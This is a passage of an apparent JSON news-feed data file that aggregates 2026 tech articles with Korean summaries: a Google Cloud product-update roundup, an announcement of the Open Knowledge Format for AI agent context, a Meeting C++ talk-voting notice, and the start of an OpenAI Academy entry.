+    "cleanContent": "Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. \n\nTip: Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources.\n\n\n\n    aside_block\n    \n\nJun 8 - Jun 12\nSimplify Multi-Cloud Planning with Cloud Location Finder, now Generally Available \nCloud Location Finder provides up-to-date data on public regions, zones, and Google Distributed Cloud Connected locations across Google Cloud, AWS, Azure, and OCI. You can now programmatically discover locations based on provider, proximity, territory, and carbon footprint to optimize your global infrastructure strategy for performance, compliance, and sustainability. \nGet started for free today\nJun 1 - Jun 5\nModeling the physical world with BigQuery Graph\nManaging complex supply chains requires more than just spreadsheets; it requires a digital replica of the physical world. In this post, Guru Rangavittal and Candice Chen explore how BigQuery Graph enables organizations to build a digital twin by turning physical assets into an interconnected map of nodes and edges. By moving beyond traditional relational databases, businesses gain real-time clarity into operations—from executing surgical ingredient recalls to analyzing weather-driven logistics risks. Discover how BigQuery Graph transforms reactive firefighting into proactive, precision modeling, allowing you to see critical connections in seconds and future-proof your supply chain.\nApigee for AI: Govern LLMs and MCP Servers (Presented in Spanish)\nLearn how to securely transition your AI initiatives from experimental prototypes to enterprise-ready deployments. Join Luis Cuellar on June 18 for a technical deep dive (presented in Spanish) exploring Apigee’s latest AI gateway capabilities. Discover how to centralize governance over Model Context Protocol (MCP) servers, protect Large Language Models (LLMs) with robust API gateway security policies, and manage token-based quotas.\nRegister for the June 18 Spanish Community TechTalk\nMay 25 - May 29\nAnthropic’s Claude Opus 4.8 is now available on Gemini Enterprise Agent Platform. As we continue to expand our platform's model offerings, this addition gives organizations more options for handling complex, multi-stage enterprise workflows. Claude Opus 4.8 brings strong capabilities in agentic coding, allowing developers to manage extensive refactors and tracking dependencies over extended sessions.\nAPI Horizon Munich July 6, 2026: Orchestrating the Next Era of AI and APIs \nMaster the orchestration of next-gen AI and digital ecosystems. Join Google Cloud experts and DACH tech leaders on July 6 for an exclusive look at the Apigee roadmap, Agent Management, and Model Context Protocol (MCP). Gain real-world insights and connect with the regional integration community.\nRegister now\nSecuring AI Agents: The Extended Agent Gateway Pattern\nLearn how to prevent autonomous AI agents from invoking unauthorized APIs. Join Apigee Specialist Joel Gauci on June 4 for a technical deep dive into the Extended Agent Gateway pattern. This session covers enforcing Fine-Grained Authorization (FGA), implementing secure token exchange, and establishing Model Context Protocol (MCP) governance at the API gateway layer to protect enterprise backend services.\nRegister for the June 4 Community TechTalk\nAPI-to-Agent Security: Exposing REST APIs to Gemini Enterprise via MCP\nConnect Gemini Enterprise agents to core data without creating security hazards. Join Google Cloud Specialist Nigel Walters on June 11 to learn how to instantly transform legacy REST APIs into secure Model Context Protocol (MCP) servers. We’ll cover how to safely register tools with Gemini while enforcing gateway-level guardrails like rate limiting and access control policies.\nRegister for the June 11 Community TechTalk\nMay 18 - May 22\nChinese Webinar | June 4: AI Command and Control\nAs AI agents move from experimental pilots to core enterprise functions, governance has become a critical next step. Join Google Cloud on June 4th at 10:00 AM (Beijing Time) to learn how to build a secure AI management layer architecture. We'll explore how to develop governed MCP (Model Context Protocol) endpoints, manage tool access to enterprise data, and leverage robust audit logs to operationalize AI. This session also includes a practical demonstration of these governance frameworks on Google Cloud.\nRegister here\nGCP Announces New Features to Benchmark and Optimize LLMs for On-Device Use Cases\nDeploying fine-tuned LLMs from GCP to edge devices like smartphones is complex due to fragmented hardware. Google AI Edge Portal bridges this gap, giving GCP developers the ability to test AI performance on 120+ Android devices, representing the full diversity of high, medium, and low tier smartphones on the market today. This week at I/O, we announced brand new capabilities to benchmark and debug LLM performance across these devices. Sign-up to utilize these new features in private preview today.\nMay 11 - May 15\nBuild Your AI & MCP Control Tower for Universal Governance\nMaster the future of agentic security with Apigee. Join our Community TechTalk on May 21 to discover how Apigee serves as a central \"Control Tower\" for the Model Context Protocol (MCP). We will explore how new JSON-RPC tool authorization enables fine-grained access policies across your organization, ensuring secure and scalable AI deployments. Whether managing internal tools or external users, learn to govern your agentic ecosystem with absolute precision. This session is designed for global coverage across EMEA and AMER regions.\nRegister for the May 21 Community TechTalk\nApr 27 - May 1\nMaster Your Launch: The Apigee Production Go-Live Checklist\nEnsure a secure launch with the Apigee production guide. Join Nicola Cardace on May 28 to explore security guardrails, including IAM roles, mTLS configurations, and encrypted KVM migrations. Scheduled at 11 AM EDT / 5 PM CEST to support EMEA and AMER teams, this TechTalk provides the technical roadmap you need to flip the switch with absolute confidence.\nRegister for the May 28 Community TechTalk\nTransforming APIs into Governed Agentic Tools on the Google Cloud Agentic Platform\nTurn your APIs into secure, governed agentic tools on the Google Cloud Agentic Platform. Join Specialist Christophe Lalevée on May 7 for a technical deep dive into AI productization. Scheduled at 5 PM CEST / 11 AM EDT to maximize coverage for developers across EMEA and AMER, this session explores the integration and governance frameworks required to scale enterprise-ready AI with confidence.\nRegister for the May 7 Community TechTalk\nFractional G4 VMs are Generaly Available, providing a highly efficient and cost-effective entry point for AI and graphics workloads. These new configurations, using NVIDIA virtual GPU (vGPU) technology, allow you to leverage the power of the NVIDIA RTX PRO 6000 Blackwell Server Edition GPUs in flexible, smaller increments, so you can right-size your infrastructure to match the specific demands of your applications. By providing more granular access to advanced hardware, fractional G4 VMs let you optimize resource allocation and reduce overhead without sacrificing performance. You can now select from additional GPU slice sizes for your specific needs:\r\n\n1/2 GPU: Ideal for more intensive tasks such as LLM inference, robotics sensor simulation, and high-fidelity 3D rendering.\n1/4 GPU: Optimized for mainstream workloads, including mid-range creative design, video transcoding, and real-time data visualization.\n1/8 GPU: Great for lightweight applications such as remote desktops, productivity tools, and entry-level streaming services.\nTransitioning AI from a sandbox prototype to an enterprise-grade system is a major hurdle. A monolithic script won't suffice for widespread deployment. To achieve true scale and reliability with Gemini, organizations must adopt service-oriented micro-agent architectures, establish Zero-Trust security, and implement rigorous EvalOps. Master the \"Agentic Maturity Ladder\" to ensure your AI & Agentic solutions are robust, secure, and ready for the real world.\nWatch the deep dive and read the developer blog to learn more.\nML Development in VS Code with Google Cloud Power: Workbench Extension Now Available\nData scientists and developers can now combine the local productivity of VS Code with the scalable infrastructure of Google Cloud. The new Google Cloud Workbench Notebooks extension allows you to connect to and run notebooks on managed cloud environments directly within your local IDE. This integration streamlines the ML lifecycle by eliminating context switching and providing high-performance compute for complex workloads in a familiar interface. As part of our commitment to the developer ecosystem, the extension is fully open-sourced to support community-driven innovation.\r\n\nInstall from Marketplace: GoogleCloudTools.workbench-notebooks\nContribute on GitHub: colab-enterprise-vscode\nApr 20 - Apr 24\nAnnouncing the 2026 Google Cloud Partners of the Year\nGoogle Cloud is honored to celebrate the winners of the 2026 Partner of the Year awards! These awards recognize an exceptional group of partners across AI, Security, Infrastructure, and more, who have demonstrated a commitment to customer success. From global system integrators to specialized startups, these winners are leveraging the power of Google Cloud to solve complex challenges and drive digital transformation worldwide. Join us in congratulating these organizations for their innovation, collaboration, and impactful results over the past year.\nSee the 2026 Partner Award winners\nApr 13 - Apr 17\nWe're excited to announce the Public Preview of Datastream’s metadata integration with Knowledge Catalog. This is the first step in our vision to provide a centralized, \"single pane of glass\" for all Datastream assets. The enhancement automatically synchronizes Streams, Connection Profiles, and Private Connections, eliminating data silos. It enhances discoverability, allowing you to search for Datastream assets using the same interface as BigQuery tables. Centralized governance is also provided, making your real-time data estate more transparent and easier to manage.\nUpgrading Apigee OPDK to 4.53 with OS Modernization\nModernize your infrastructure using Google’s official, sequential upgrade path. Our Technical expert, Rakesh Talanki outlines how to upgrade Apigee OPDK to v4.53 while migrating to a supported OS (RHEL 8.x/9.x). This guide covers the \"build-out\" methodology, including multi-data center syncing, to ensure a stable, zero-downtime transition\nRead the guide\nCloud Run Worker Pools and CREMA: Powering Serverless AI at Scale\nGoogle Cloud has announced the General Availability of Cloud Run worker pools, a new resource type designed specifically for pull-based, non-HTTP workloads. Unlike traditional Cloud Run services that scale based on request traffic, worker pools provide an \"always-on\" environment for background tasks like processing message queues or running large-scale AI inference. To support this, Google Cloud also open-sourced the Cloud Run External Metrics Autoscaler (CREMA). Built on KEDA, CREMA enables queue-aware autoscaling for worker pools, allowing them to dynamically scale based on external signals like Pub/Sub backlog or Kafka lag.\nApigee Model Context Protocol (MCP) now Generally Available\nExpose enterprise APIs as MCP tools for agentic AI applications with the General Availability of MCP in Apigee. This update allows developers to transform APIs into AI-ready tools using OpenAPI Specifications, removing the need for local MCP servers or additional infrastructure. With managed endpoints and semantic search in API hub, you can now provide AI agents with secure, governed access to enterprise data at scale.\nExplore the MCP overview\nApr 6 - Apr 10\nCommunity TechTalk: Powering Retail Agents with ADK, UCP & Apigee X\nMove beyond basic chatbots to secure, transactional AI experiences. Join our Community TechTalk on April 16 to learn how Apigee X and Gemini build a \"Trust Layer\" for AI shopping assistants using UCP standards. We’ll demonstrate how to block prompt injections with Model Armor and implement cost governance via token limits to secure the path from discovery to purchase.\nRegister for the TechTalk\nImplement multimodal capabilities in your AI agents\nExplore three new reference architectures for building sophisticated multi-agent AI systems that can process and analyze multimodal data. To analyze disparate multimodal data and produce a high-confidence classification, see Classify multimodal data. To create a fluid conversational AI that processes audio and video streams in real time, see Enable live bidirectional multimodal streaming. To consolidate fragmented multimodal data into a searchable knowledge graph, see Multimodal GraphRAG resource orchestration.\nAutomate SecOps workflows with an agentic AI system\nTo accelerate incident response and reduce manual toil for your security team, you need a system that can automate remediation playbooks. Our new reference architecture helps you build an AI agent that orchestrates complex triage and investigation workflows across disparate security tools, such as SIEM, CSPM, and EDR, from a single interface. See the full guide to orchestrate security operations workflows.\nMar 30 - Apr 3\nASEAN Webinar | April 30: Mastering Agentic Governance at Scale with GCP\nAs AI agents move from experimental pilots to core enterprise functions, governance is the critical next step. Join Google Cloud experts Shilpi Puri & Wely Lau for a webinar on April 30th at 11:00 AM SGT to learn how to architect a secure AI Management layer. We’ll explore developing governed MCP endpoints, managing tool access to enterprise data, and operationalizing AI with robust audit logs. The session includes a live demo of these frameworks in action on Google Cloud.\nRSVP here.\nMar 23 - Mar 27\nTurn your API sprawl into an agent-ready catalog\nAs organizations scale, APIs often become scattered across multiple gateways, creating \"blind spots\" that hinder AI adoption. To solve this, we’ve introduced two new capabilities for Apigee API hub: a new integration with API Gateway to automatically centralize API metadata into a single control plane, and a specification boost add-on (now in public preview). This add-on uses AI to enhance your API documentation with the precise examples and error codes that AI agents need to function reliably.\nRead the full blog post to get started.\nWebinar | April 16: AI Command & Control\nAs AI agents move from experimental pilots to core enterprise functions, governance is the critical next step. Join Google Cloud expert Satyam Maloo for a webinar on April 16th at 11:00 AM IST to learn how to architect a secure AI Management layer. We’ll explore developing governed MCP endpoints, managing tool access to enterprise data, and operationalizing AI with robust audit logs. The session includes a live demo of these frameworks in action on Google Cloud.\nRSVP here.\nModernizing and Decoupling Event Ingestion with Apigee\nIn modern cloud-native architectures, decoupling producers from consumers is critical for building resilient systems. While Google Cloud Pub/Sub provides a scalable backbone, exposing it directly to external clients can introduce security and management overhead. This new guide explores how to leverage Apigee as an intelligent HTTP ingestion point. Learn how to handle security, mediation, and traffic control before messages reach your internal bus using the PublishMessage policy or Pub/Sub API.\nRead the full guide.\nMar 16 - Mar 20\nGemini-powered Assistant in BigQuery Studio Gets Context-Aware Upgrades\nThe Gemini-powered assistant in BigQuery Studio has been transformed into a fully context-aware analytics partner, supporting your entire data lifecycle. The new capabilities include intelligent resource discovery, which uses Dataplex Universal Catalog search to find resources across projects and deep dive into metadata using natural language. You can now automate tasks, such as scheduling production-grade queries directly through the chat interface, and instantly troubleshoot long-running or failed jobs with root cause analysis and cost control auditing.\nExplore the full range of what the assistant can do.\nMar 9 - Mar 13\nWant to use Gemini to develop code and don't know where to start?\nThis article includes a couple of examples of developing code with Gemini prompts; it identified changes that were needed to be made to get the code working. The article also refers to other examples that are available on github. \nMar 2 - Mar 6\nIntroducing Gemini 3.1 Flash-Lite, our fastest and most cost-efficient Gemini 3 series model. Built for high-volume developer workloads at scale, 3.1 Flash-Lite delivers high quality for its price and model tier. Gemini 3.1 Flash-Lite can tackle tasks at scale, like high-volume translation and content moderation, where cost is a priority. And it can also handle more complex workloads where more in-depth reasoning is needed, like generating user interfaces and dashboards, creating simulations or following instructions.\nStarting today, 3.1 Flash-Lite is rolling out in preview to enterprises via Vertex AI and developers via the Gemini API in Google AI Studio.\nTechTalk: Implementing Device Authorization Grant (RFC 8628) for Apigee\nLearn how to authorize \"headless\" devices like Smart TVs or AI agents that lack keyboards and browsers. Join our Community TechTalk on March 19 (5PM CET / 12PM EDT) to go under the hood of Apigee X/Hybrid. We’ll cover the real-world mechanics of state management, polling, and human-in-the-loop security patterns for devices and autonomous agents.\nRegister for the TechTalk\nFeb 23 - Feb 27\nPro-level image generation gets faster and more accessible with Nano Banana 2\nNano Banana 2 is our state-of-the-art image generation and editing model. It delivers Pro-level image generation and editing at the speed you expect from Flash — making the quality, reasoning, and world knowledge you loved about Nano Banana Pro more accessible. Learn more about the model here.\nThe Intelligent Path to Compliance: Transforming Regulatory QC with Google Cloud\nReducing \"Refuse to File\" (RTF) risks and submission cycle times is critical for life sciences leaders. Google Cloud’s Regulatory Submission Semantic QC Auditor leverages Gemini and RAG architecture to transform Quality Control from a manual burden into an active, intelligent workflow.\nBy automating semantic cross-referencing, narrative coherence checks, and dynamic guidance-based auditing, this solution ensures rigorous accuracy and auditability. Operating within a secure GxP-ready environment, it empowers teams to detect subtle inconsistencies and generate remediation plans without sacrificing data privacy. \nLearn more.\nStop typing, start interacting! The Gemini Live Agent Challenge is here. Build immersive agents that can help you see, hear, and speak using Gemini and Google Cloud. Compete for your share of $80,000+ in prizes and a trip to Google Cloud Next '26!\nSubmissions are open from February 16, 2026 to March 16, 2026. Learn more and register at geminiliveagentchallenge.devpost.com\nFeb 9 - Feb 13\nIntroducing Gemini 3.1 Pro on Google Cloud. \n3.1 Pro is a noticeably smarter, more capable baseline for complex problem-solving. We’re shipping 3.1 Pro at scale, building upon our goal to help you transform your business for the agentic future. Learn more about the model’s capabilities here. Gemini 3.1 Pro is available starting today in preview in Vertex AI and Gemini Enterprise. Developers can access the model in preview via the Gemini API in Google AI Studio, Android Studio, Google Antigravity, and Gemini CLI.\n\nAutomate Storage Compatibility with GKE Dynamic Default Storage Classes\nManaging storage across mixed-generation VM clusters in GKE just got easier. With the new Dynamic Default Storage Class, Google Kubernetes Engine automatically selects between Persistent Disk (PD) and Hyperdisk based on a node's specific hardware compatibility. This abstraction eliminates the need for complex scheduling rules and manual pairing, ensuring your volumes \"just work\" regardless of the underlying infrastructure. By defining both variants in a single class, you reduce operational overhead while maintaining peak performance and cost-efficiency across your entire cluster.\nExplore automated disk type selection\nCommunity TechTalk: AI-Powered Apigee Development with strofa.io\nJoin the Apigee community on February 26 for a deep dive into strofa.io. Guest speaker Denis Kalitviansky will demonstrate how this new AI-powered tool automates and orchestrates Apigee development, from local emulators to large-scale hybrid environments. Discover how to scale your API management and streamline team collaboration using the latest in AI-driven automation.\nRegister now to reserve your spot.\nJan 26 - Jan 30\nSimplify API Governance with Native OpenAPI v3 Support\nEliminate integration debt and accelerate deployment velocity with the General Availability of OpenAPI v3 (OASv3) support for API Gateway and Cloud Endpoints. You no longer need to downgrade modern specifications to OASv2. Instead, you can now define API contracts and enforce critical policies—including telemetry, quotas, and security—using native Google-specific extensions directly within your OASv3 files. This update ensures your APIs are secure by design while remaining fully compatible with the modern developer ecosystem and Google Cloud’s AI services.\nGet started with OpenAPI v3 on API Gateway and Cloud Endpoints.\nAccelerate API Testing with the New Open Source API Tester\nStart validating your APIs with API Tester, a simple, YAML-based Test Driven Development (TDD) framework. Designed for the Apigee community, this tool allows you to write human-readable tests, run them instantly via a web client or CLI, and perform deep unit testing on Apigee proxies. With native support for JSONPath assertions and Apigee shared flows, you can verify everything from payload data to internal variables like proxy.basepath without leaving your terminal.\nExplore the API Tester guide and start testing your proxies today.\nSecure Sensitive Data with Kubernetes Secrets in Apigee hybrid\nEnhance security in Apigee hybrid by accessing Kubernetes Secrets directly within your API proxies. This hybrid-exclusive feature keeps sensitive credentials within your cluster boundary and prevents replication to the management plane. It supports strict separation of duties: operators manage secrets via kubectl, while developers reference them as secure flow variables—ideal for high-compliance and GitOps workflows.\nImplement Kubernetes Secrets in your hybrid proxies.\nSee the Console in a Whole New Light: Dark Mode is Now Generally Available in Google Cloud\nElevate your cloud management workflow with Dark Mode, now generally available in the Google Cloud console. We have delivered a modern, cohesive, and accessible experience reimagined for maximum comfort and productivity—especially during extended working hours and low-light environments. Dark Mode can be enabled automatically based on your operating system's preference, or manually through the Settings  -> Appearance menu.\nSwitch to Dark Mode today to enjoy a modern, comfortable, and productive environment!\nApigee X Networking: PSC or VPC Peering?\nDeciding how to connect Apigee X? Watch this video to compare Private Service Connect and VPC Peering. We break down northbound and southbound routing, IP consumption, and how to reach targets on-prem or in the cloud. Learn to simplify your architecture and avoid common networking \"gotchas\" for a smoother deployment.\nWatch the video.\nJan 19 - Jan 23\nBridge the Gap: Excel-to-API Conversion in Apigee Portals\nGive your customers more ways to connect! This new article by Tyler Ayers explores how to extend the Apigee Integrated Portal to support direct Excel file uploads. By leveraging SheetJS and custom portal scripts, you can enable users to upload spreadsheets, preview data, and submit it directly to your APIs, all without writing a single line of integration code themselves. It’s a powerful way to simplify onboarding for those who aren't yet API-ready.\nLearn how to build it.\nElevate your applications with Firestore’s new advanced query engine\nWe have fundamentally reimagined Firestore with pipeline operations for Enterprise edition. Experience a powerful new engine featuring over a hundred new query features, index-less queries, new index types, and observability tooling to improve query performance. Seamlessly migrate using built-in tools and leverage Firestore’s existing differentiated serverless foundation, virtually unlimited scale, and industry-leading SLA. Join a community of 600K developers to craft expressive applications that maximize the benefits of rich queryability, real-time listen queries, robust offline caching, and cutting-edge AI-assistive coding integrations.\nLearn more about Firestore pipeline operations.",
+    "url": "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
+    "category": "클라우드 & 인프라",
+    "source": "Google Cloud Blog",
+    "author": {
+      "$": {
+        "xmlns:author": "http://www.w3.org/2005/Atom"
+      },
+      "name": [
+        "Google Cloud Content & Editorial "
+      ],
+      "title": [
+        ""
+      ],
+      "department": [
+        ""
+      ],
+      "company": [
+        ""
+      ]
+    },
+    "pubDate": "Fri, 12 Jun 2026 16:00:00 +0000",
+    "fetchedAt": "2026-06-14T10:33:56.852Z",
+    "tags": [
+      "GCP",
+      "Cloud"
+    ]
+  },
+  {
+    "id": "https://cloud.google.com/blog/products/data-analytics/how-the-open-knowledge-format-can-improve-data-sharing/",
+    "title": "Introducing the Open Knowledge Format",
+    "summary": "As foundation models continue to improve, the lack of relevant context often limits what they can do, especially as they are used to build agentic systems. While these models can help you write code, ",
+    "aiSummary": "Google Cloud Data Cloud 팀은 AI 에이전트가 보다 정확하고 효과적으로 정보를 활용할 수 있도록 지원하는 개방형 사양인 Open Knowledge Format(OKF)을 발표했습니다. 현재 기업 내 지식은 위키, 메타데이터 카탈로그, 코드 주석 등 다양한 시스템에 파편화되어 있어 에이전트 구축 시마다 매번 데이터를 통합해야 하는 어려움이 있습니다.\n\nOKF는 이러한 문제를 해결하기 위해 특정 플랫폼이나 SDK에 종속되지 않는 범용적인 지식 표준을 제시합니다. OKF의 핵심 구조는 YAML frontmatter가 포함된 마크다운 파일들로 구성되어 있어, 사람이 읽기 쉽고 에이전트가 별도의 변환 과정 없이 즉시 처리할 수 있습니다. 이는 복잡한 압축 방식이나 런타임을 요구하지 않으며, 깃 저장소나 파일 시스템 등 어디서든 손쉽게 관리하고 이동할 수 있는 것이 특징입니다.\n\n이 표준의 핵심 원칙은 최소한의 규칙만을 정의하는 유연성, 생산자와 소비자 간의 독립성, 그리고 특정 플랫폼에 얽매이지 않는 개방성입니다. OKF는 문서를 지식 그래프 형태로 연결하여 데이터셋, API 명세, 운영 가이드 등 다양한 정보를 체계적으로 관리할 수 있게 합니다.\n\nGoogle은 OKF의 활용을 돕기 위해 BigQuery 데이터셋을 OKF 문서로 변환하는 에이전트와 OKF 번들을 시각화하는 HTML 도구를 레퍼런스 구현체로 함께 제공합니다. 현재 OKF v0.1 사양과 관련 예제는 GitHub를 통해 공개되어 있으며, Google Cloud의 Knowledge Catalog 또한 OKF를 지원하도록 업데이트되었습니다. 이는 단순히 새로운 서비스를 만드는 것이 아니라, 파편화된 지식 생태계를 하나로 연결할 수 있는 공통 언어를 구축하려는 시도입니다.",
+    "cleanContent": "As foundation models continue to improve, the lack of relevant context often limits what they can do, especially as they are used to build agentic systems. While these models can help you write code, summarize documents, or analyze a dataset, they still need the right information to produce accurate and actionable results. \nThat’s why today, we’re introducing the Open Knowledge Format (OKF), an open specification that formalizes the LLM-wiki pattern into a portable, interoperable format. This is a vendor-neutral, agent- and human-friendly standard for representing the metadata, context, and curated knowledge that modern AI systems need.\nAs published, OKF v0.1 represents knowledge as a directory of markdown files with YAML frontmatter, with a small set of agreed-upon conventions that let wikis written by different producers be consumed by different agents without translation.\nThat's it. No complex compression scheme, no new runtime, no required SDK. A bundle of OKF documents is:\nJust markdown — readable in any editor, renderable on GitHub, indexable by any search tool\nJust files — shippable as a tarball, hostable in any git repo, mountable on any filesystem\nJust YAML frontmatter — for the small set of structured fields that need to be queryable: type, title, description, resource, tags, and timestamp\nIf you've used Obsidian, Notion, Hugo, or any of the LLM wiki patterns that have emerged over the past year, the shape will feel familiar. OKF formalizes the small set of conventions needed to make these patterns interoperable.\nLet’s take a look at the problem that OKF can solve for your organization, how it works, how to get started with it, and what’s next.\nA fragmented context landscape\nIn most organizations, the information that foundation models use is overwhelmingly internal knowledge: the schema of a table, your business’ meaning of a metric, the runbook for an incident, the join paths between two systems, the deprecation notice for an old API, etc.\nToday, these atoms of knowledge live in a variety of highly fragmented systems:\nMetadata catalogs with their own APIs\nWikis, third-party systems, or in shared drives\nCode comments, docstrings, or notebook cells\nThe heads of a few senior engineers\nWhen an AI agent needs to answer \"How do I compute weekly active users from our event stream?\" it has to assemble the answer from these scattered, mutually incompatible surfaces. Every vendor offers its own catalog, its own SDK, its own knowledge-graph schema, and none of the knowledge is easily portable across products or organizations.\nThe result: Every agent builder is solving the same context-assembly problem from scratch, every catalog vendor is reinventing the same data models, and the knowledge itself is locked behind whichever surface created it.\nKnowledge as a living wiki\nDeveloper teams are changing how they build AI agents. Instead of using models to search the same documents for the same facts over and over, you can give your agents a shared markdown library that grows more useful over time. This lets your agents take on the drudgery of reading and updating their own files, while your team curates the content and manages it like code. \nAndrej Karpathy, the prominent AI researcher and educator, articulates this idea most crisply in his LLM Wiki gist. \"LLMs don't get bored, don't forget to update a cross-reference, and can touch 15 files in one pass,\" he writes. The bookkeeping that causes humans to abandon personal wikis is exactly what LLMs are good at.\nSimilar knowledge-as-Wiki pattern keeps reappearing under different names: Obsidian vaults wired to coding agents, the AGENTS.md / CLAUDE.md family of convention files, repos full of index.md and log.md artifacts that agents consult before doing real work, and \"metadata as code\" repositories inside data teams. \nThe pattern is compelling and powerful, but each instance is bespoke. Karpathy's wiki and your team's wiki and a vendor's catalog export may all look alike (markdown, frontmatter, cross-links), but none of them are intentionally designed to cooperate. There is no agreed-upon answer to what fields every document should carry, or what filenames mean what. As a result, the knowledge encoded in wikis remains siloed within the original teams, leading to redundant effort whenever a new agent is built.\nWhat's missing is a format, not another service\nThe answer to this problem isn’t another knowledge service. You need a format, a way to represent knowledge that:\nAnyone can produce, without an SDK\nAnyone can consume, without an integration\nSurvives moving between systems, organizations, and tools\nLives in version control alongside the code it describes\nIs readable by humans and parseable by agents: the same file, no translation layer\nBy design, OKF is that format. \nHow OKF works: The design in one screen\nAn OKF bundle is a directory of markdown files representing concepts: anything you want to capture, including tables, datasets, metrics, playbooks, runbooks, and APIs. Each concept is one file. The file path is the concept's identity:\n\n\n    code_block\n    )])]>\n\nEach concept document has a small block of YAML front matter for structured fields and a markdown body for everything else:\n\n\n    code_block\n    )])]>\n\nConcepts link to each other with normal markdown links, turning the directory into a graph of relationships that is richer than the parent/child links implied by the file system. Bundles can optionally include index.md files (for progressive disclosure as agents navigate the hierarchy) and log.md files (for chronological history of changes).\nThe full v0.1 specification (including conformance criteria, cross-linking rules, and the small number of reserved filenames) fits on a single page.\nThree principles behind the design\n1. Minimally opinionated. OKF requires exactly one thing of every concept: a type field. Everything else (e.g., what types exist, what other fields to include, what sections the body has) is left to the producer. The spec defines the interoperability surface, not the content model.\n2. Producer/consumer independence. OKF cleanly separates who writes the knowledge from who consumes it. A bundle hand-authored by a human can be consumed by an AI agent. A bundle generated by a metadata export pipeline can be browsed in a visualizer. A bundle synthesized by one LLM can be queried by another. The format is the contract; the tooling at each end is independently swappable.\n3. Format, not platform. OKF is not tied to any specific cloud, database, model provider, or agent framework. It will never require a proprietary account or SDK to read, write, or serve. We're publishing it as an open standard because the value of a knowledge format comes from how many parties speak it, not from who owns it.\nWhat we're shipping with the spec\nTo make the format concrete, we're publishing reference implementations at both the producer and consumer ends:\nAn enrichment agent that walks a BigQuery dataset, drafts an OKF concept document for every table and view, then runs a second LLM pass that crawls authoritative documentation and enriches each concept with citations, schemas, and join paths.\nA static HTML visualizer that turns any OKF bundle into an interactive graph view in a single self-contained file; no backend, no install on the viewing side, no data leaves the page.\nThree ready-to-browse sample bundles: GA4 e-commerce, Stack Overflow, and Bitcoin public datasets, produced by the reference agent and committed to the repo as living examples of conformant OKF.\nThese are proofs of concept, deliberately. The agent demonstrates one way to produce OKF; nothing about the format requires a specific agent framework or LLM. The visualizer demonstrates one way to consume it; nothing about the format requires HTML or a graph view. We expect (and want!) the ecosystem of producers and consumers to grow far beyond what we've shipped.\nWhere we go from here\nOKF v0.1 is a starting point, not a finished standard. The format will evolve as more producers and consumers emerge and as we collectively learn what knowledge representations agents actually need in practice.\nWe're publishing in the open from day one because that's the only way a knowledge format earns its name, whether you're building a knowledge catalog, an enrichment pipeline, a wiki tailored to AI agents, or anything in the AI knowledge domain. \nFrom here, we encourage you to:\nRead the spec (it's short!)\nWrite a producer for your source system, your database, your documentation site\nWrite a consumer: a viewer, a search index, an agent that reasons over bundles\nTry the reference implementation against your own data\nFile issues, send PRs, or propose extensions: The spec is versioned and explicitly designed for backward-compatible growth\nThe repo, the spec, and the sample bundles are available in GitHub. We have also updated Google Cloud’s Knowledge Catalog to be able to ingest Open Knowledge Format and serve it to our agents. You can find the relevant code and examples here.\nThe format itself is the contribution. The tools we've shipped exist to make it real, and to lower the cost of trying it out. Whatever shape your knowledge takes today, OKF is designed to be the lingua franca it can be exchanged for tomorrow. \nPublished by the Google Cloud Data Cloud team. Open Knowledge Format is an open specification; contributions, alternative implementations, and adoption beyond Google products are all explicitly welcomed.\nIn addition to the authors, this work came together thanks to key ideas from many others at Google, and we thank them for their contributions.",
+    "url": "https://cloud.google.com/blog/products/data-analytics/how-the-open-knowledge-format-can-improve-data-sharing/",
+    "category": "클라우드 & 인프라",
+    "source": "Google Cloud Blog",
+    "author": {
+      "$": {
+        "xmlns:author": "http://www.w3.org/2005/Atom"
+      },
+      "name": [
+        "Sam McVeety"
+      ],
+      "title": [
+        "Tech Lead, Data Analytics, Engineering, Data Cloud, Google Cloud"
+      ],
+      "department": [
+        ""
+      ],
+      "company": [
+        ""
+      ]
+    },
+    "pubDate": "Fri, 12 Jun 2026 13:00:00 +0000",
+    "fetchedAt": "2026-06-14T10:33:56.852Z",
+    "tags": [
+      "GCP",
+      "Cloud"
+    ]
+  },
+  {
+    "id": "https://isocpp.org//blog/2026/06/the-voting-on-the-talks-for-meeting-cpp-2026-has-begun",
+    "title": "The voting on the talks for Meeting C++ 2026 has begun!",
+    "summary": "The yearly voting for the conference program of Meeting C++ has begun! You can vote on 118 talks until Sunday 21st.\nThe voting on the talks for Meeting C++ 2026 has begun!\nMeeting C++ 2026! Thanks to ",
+    "aiSummary": "Meeting C++ 2026 컨퍼런스의 프로그램 구성을 위한 연례 투표가 시작되었습니다. 이번 행사에는 총 118개의 발표 주제가 후보로 올랐으며 오는 21일 일요일까지 투표가 진행됩니다.\n\n이번 행사는 Berlin 현장과 온라인을 병행하여 개최될 예정입니다. 올해 티켓을 구매했거나 과거 Meeting C++에서 발표한 경험이 있는 사람, 혹은 작년 컨퍼런스에 참여했던 사람에게는 투표 과정에서 더 높은 가중치가 부여됩니다. 발표 제안을 보내준 모든 참가자와 티켓을 구매해준 분들에게 감사의 인사를 전하며 올해도 성공적인 컨퍼런스를 만들기 위한 투표가 활발히 진행될 예정입니다.",
+    "cleanContent": "The yearly voting for the conference program of Meeting C++ has begun! You can vote on 118 talks until Sunday 21st.\nThe voting on the talks for Meeting C++ 2026 has begun!\nMeeting C++ 2026! Thanks to all folks who have submitted a talk to this years conference! Your contribution will create another great conference in Berlin and online! And special thanks to all folks who have bought tickets already for the conference, you'll have a bit more weight in the voting to shape this years program! Same is true if you spoke at Meeting C++ in the past or attended last years conference.",
+    "url": "https://isocpp.org//blog/2026/06/the-voting-on-the-talks-for-meeting-cpp-2026-has-begun",
+    "category": "프로그래밍 언어",
+    "source": "ISO C++",
+    "author": "Meeting C++",
+    "pubDate": "Fri, 12 Jun 2026 10:41:36 +0000",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "C++"
+    ]
+  },
+  {
+    "id": "https://openai.com/index/academy-courses-applying-ai-at-work",
+    "title": "New OpenAI Academy courses for the next era of work",
+    "summary": "OpenAI introduces three Academy courses that help people build practical AI skills, create repeatable workflows, and apply agents in everyday work.",
